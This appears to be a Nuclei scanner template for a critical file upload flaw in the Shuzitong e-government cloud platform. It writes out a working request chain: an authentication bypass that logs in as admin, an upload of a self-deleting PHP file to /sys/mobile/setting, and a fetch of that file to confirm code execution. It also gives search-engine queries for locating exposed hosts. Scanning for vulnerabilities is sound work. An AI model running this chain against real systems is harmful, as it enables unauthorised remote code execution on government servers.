id: sztbj-setting-fileupload
info:
  name: 数字通云平台智慧政务 setting - fileupload
  author: leadlife
  severity: critical
  description: 数字通云平台智慧政务setting存在文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。
  reference: 
    - https://github.com/wy876/POC/blob/main/%E6%95%B0%E5%AD%97%E9%80%9AOA/%E6%95%B0%E5%AD%97%E9%80%9A%E4%BA%91%E5%B9%B3%E5%8F%B0%E6%99%BA%E6%85%A7%E6%94%BF%E5%8A%A1setting%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="assets/8cca19ff/css/bootstrap-yii.css"
    hunter-query: app.name="中科数字通 "
  tags: sztbj,fileupload,oa

http:
  - raw:
      - |
        POST /portal/default/login HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Upgrade-Insecure-Requests: 1
        Priority: u=0, i
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
        Content-Type: application/x-www-form-urlencoded
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0

        userID=admin&flag=rone
      
      - |+
        POST /sys/mobile/setting HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Cookie: your-cookie
        X-Requested-With: XMLHttpRequest
        Cookie: {{goasessid}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
        Accept-Encoding: gzip, deflate
        Content-Type: multipart/form-data; boundary=---------------------------318638034016337576332132513456

        -----------------------------318638034016337576332132513456
        Content-Disposition: form-data; name="MobileApplication[cert]"; filename="lead.php"
        Content-Type: application/octet-stream

        <?php print("{{randstr}}");unlink(__FILE__);?>
        -----------------------------318638034016337576332132513456--
        
      - |+
        GET /static/seal/lead.php HTTP/1.1
        Host: {{Hostname}}
        Cookie: {{goasessid}}


    extractors:
      - type: regex
        part: header_1
        name: goasessid
        internal: true
        regex:
          - "Set-Cookie:.*?GOASESSID=([^;]+)"
          
    matchers:
      - type: dsl
        dsl:
          - contains(body_3,'{{randstr}}')
        condition: and